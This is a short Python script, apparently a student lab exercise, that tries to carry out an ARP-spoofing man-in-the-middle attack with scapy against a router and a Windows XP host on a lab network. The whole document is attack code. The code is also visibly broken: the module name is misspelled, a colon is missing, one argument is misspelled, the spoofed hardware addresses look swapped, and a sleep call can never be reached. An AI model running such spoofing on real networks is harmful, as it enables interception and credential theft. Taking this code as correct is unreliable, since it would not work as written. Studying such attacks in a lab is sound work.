## LAB 02 -- TLS MITM ATTACK
##
## system redirects from a secure version of a webpage to an unsecured one
##
## Farhad Ahmed -- fa961
## 03/12/19
##


from scapt.all import *
from time import sleep
import os
import sys



def main()
    rtrIP = "10.10.111.1"
    winXP_IP = "10.10.111.101"
    winXP_MAC = "00:00:00:00:00:04"
    rtrMAC = "00:00:00:00:00:02"

    while(True):
        send(ARP(op = 2, psrc = rtrIP, pddst = winXP_IP, hwsrc = winXP_MAC))
        send(ARP(op = 2, psrc =winXP_IP, pdst = rtrIP, hwsrc = rtrMAC))

    sleep(4)


if __name__ == "__main__":
    main()
